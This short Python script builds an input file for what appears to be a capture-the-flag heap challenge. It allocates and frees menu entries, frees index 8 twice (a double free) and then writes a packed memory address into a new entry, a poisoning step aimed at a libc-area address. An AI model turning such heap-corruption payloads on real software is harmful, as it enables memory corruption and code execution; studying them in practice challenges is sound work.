import struct
step = b''
step += b"a\na\n1\n"*10
step += b"r\n1\n"
step += b"r\n2\n"
step += b"r\n3\n"
step += b"r\n4\n"
step += b"r\n5\n"
step += b"r\n6\n"
step += b"r\n7\n"
step += b"r\n8\n"
step += b"r\n9\n"
step += b"r\n8\n"
step += b"a\na\n1\n"*7
# 0x7ffff085b54e
hex = struct.pack("<Q", 0x7ffff085b54e)

step += b"a\n" + hex + b"\n1\n"
step += b"a\na\n1\n"*2
step += b"a\nadityateam\n1\n"
step += b"x\n"

x = open("inp", "wb")
x.write(step)
x.close()